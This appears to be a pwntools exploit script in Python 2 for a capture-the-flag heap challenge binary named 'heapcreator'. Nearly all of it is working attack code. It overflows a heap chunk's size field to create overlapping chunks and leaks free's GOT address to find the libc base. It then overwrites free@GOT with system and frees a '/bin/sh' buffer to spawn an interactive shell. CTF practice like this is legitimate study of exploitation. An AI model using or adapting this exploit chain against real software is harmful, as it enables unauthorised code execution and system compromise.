#encoding:utf-8
from pwn import *
context(os="linux", arch="amd64",log_level = "debug")

ip =""
if ip:
    p = remote(ip,20004)
else:
    p = process("./heapcreator")#, aslr=0

elf = ELF("./heapcreator")
#libc = ELF("./libc-2.23.so")
libc = elf.libc
#-------------------------------------
def sl(s):
    p.sendline(s)
def sd(s):
    p.send(s)
def rc(timeout=0):
    if timeout == 0:
        return p.recv()
    else:
        return p.recv(timeout=timeout)
def ru(s, timeout=0):
    if timeout == 0:
        return p.recvuntil(s)
    else:
        return p.recvuntil(s, timeout=timeout)
def debug(msg=''):
    gdb.attach(p,'')
    pause()
def getshell():
    p.interactive()
#-------------------------------------
def create(size,contant):
    ru("Your choice :")
    sl("1")
    ru("Size of Heap : ")
    sl(str(size))
    ru("Content of heap:")
    sd(contant)

def edit(Index,contant):
    ru("Your choice :")
    sl("2")
    ru("Index :")
    sl(str(Index))
    ru("Content of heap : ")
    sd(contant)

def show(Index):
    ru("Your choice :")
    sl("3")
    ru("Index :")
    sl(str(Index))

def delete(Index):
    ru("Your choice :")
    sl("4")
    ru("Index :")
    sl(str(Index))

free_got = elf.got["free"]
print "free_got------>"+hex(free_got)
create(0x18,"a"*8)
create(0x10,"b"*8)
edit(0,"/bin/sh\x00"+"a"*0x10+p64(0x41))
#debug()
delete(1)

create(0x30,p64(0)*4+p64(0x30)+p64(free_got))
show(1)
ru("Content : ")
free = u64(p.recv(6).ljust(8,"\x00"))
libc_base = free- libc.symbols["free"]
system = libc_base+libc.symbols["system"]
print "free------>"+hex(free)
print "libc_base------>"+hex(libc_base)
edit(1,p64(system))
delete(0)
getshell()
#debug()

